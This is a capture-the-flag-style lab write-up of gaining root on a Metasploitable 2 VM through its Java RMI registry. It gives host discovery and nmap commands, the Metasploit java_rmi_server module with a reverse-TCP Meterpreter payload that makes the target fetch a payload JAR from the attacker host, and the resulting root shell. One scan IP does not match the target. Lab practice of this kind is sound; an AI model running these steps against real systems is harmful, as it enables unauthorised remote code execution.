# Metasploitable 2 Java RMI exploit write-up

Metasploitable 2 is Virtual Machine with many exploitable ports and now we are going to exploit it's one of exploit - **java**.



 > The target of this lab is use vulnerablitity in Java service running in our Vulnerable VM to gain Root access.

## 1- Finding IP
 As the first step we are finding IP address of target machine - It's the VM located in our own LAN. 

 `sudo netdiscover -i eth 0` - for discovering all devices visible on ethernet 0.
```
 Currently scanning: 192.168.126.0/16   |   Screen View: Unique Hosts                                                                                    
                                                                                                                                                         
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                             
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 .
 192.168.43.95   00:0c:29:c8:07:4e      1      60  VMware, Inc.
 .
 ```

 ## 2- Enumeration
 In this step we'll find ports and services running on VM.
  
`sudo nmap -sS -sV  192.168.42.95 ` - with nmap tool we get all the open ports running on unlnerable VM.

```
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION

.
1099/tcp open  java-rmi    GNU Classpath grmiregistry
.
.
.
```

Searching on Internet we found:

> Java RMI (Remote Method Invocation) is a tool used in Java applications to allow objects on one computer to call methods on objects located on another computer on the same network.  This enables communication between different parts of a distributed application.

## Exploitation:

We use metasploit to exploit this vulnerability:

`sudo msfconsole`

`search java rmi`

```
6   exploit/multi/misc/java_rmi_server                          2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
```

`use 6`

`show options`

```
Module options (exploit/multi/misc/java_rmi_server):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      1099             yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to li
                                         sten on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.43.132   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Generic (Java Payload)



View the full module info with the info, or info -d command.
```

Only Remote host need to set; `set RHOSTS 192.168.43.95`.

And just `run`.

```
[*] Started reverse TCP handler on 192.168.43.132:4444 
[*] 192.168.43.95:1099 - Using URL: http://192.168.43.132:8080/Ja60awBxpJCj
[*] 192.168.43.95:1099 - Server started.
[*] 192.168.43.95:1099 - Sending RMI Header...
[*] 192.168.43.95:1099 - Sending RMI Call...
[*] 192.168.43.95:1099 - Replied to request for payload JAR
[*] Sending stage (57971 bytes) to 192.168.43.95
[*] Meterpreter session 1 opened (192.168.43.132:4444 -> 192.168.43.95:43488) at 2024-07-11 03:47:26 -0400

meterpreter >
```

we gained the meterpreter, lets turn it into shell and see `whoami`:

```
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
```
